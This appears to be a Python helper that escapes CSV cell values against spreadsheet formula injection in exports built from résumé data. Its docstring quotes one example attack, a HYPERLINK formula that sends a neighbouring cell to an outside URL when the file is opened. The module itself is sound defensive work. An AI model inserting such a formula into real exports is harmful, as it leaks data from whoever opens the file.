"""Защита CSV-выгрузок от инъекции формул.

Excel и Google Таблицы исполняют ячейку CSV, начинающуюся с «=», «+», «-»,
«@» (и табуляции/перевода строки), как формулу. В выгрузки попадают имена,
должности и заметки из резюме и расширения — то есть внешний ввод: строка
`=HYPERLINK("https://…?d="&A2,"…")` у того, кто открыл файл, отправляла
соседние ячейки наружу (до 27.10.2026 не экранировалось ни в одной выгрузке).
"""
import re

_ALWAYS = ("=", "@", "\t", "\r")
# «+7 (999) 123-45-67», «-1500.50» — обычные телефон и число, их не трогаем.
_PLAIN_NUMBER = re.compile(r"^[+-][\d\s().\-]*$")


def csv_safe(value) -> str:
    """Значение для ячейки CSV: опасное начало экранируется апострофом."""
    if value is None:
        return ""
    s = str(value)
    if s.startswith(_ALWAYS) or (s[:1] in ("+", "-") and not _PLAIN_NUMBER.match(s)):
        return "'" + s
    return s
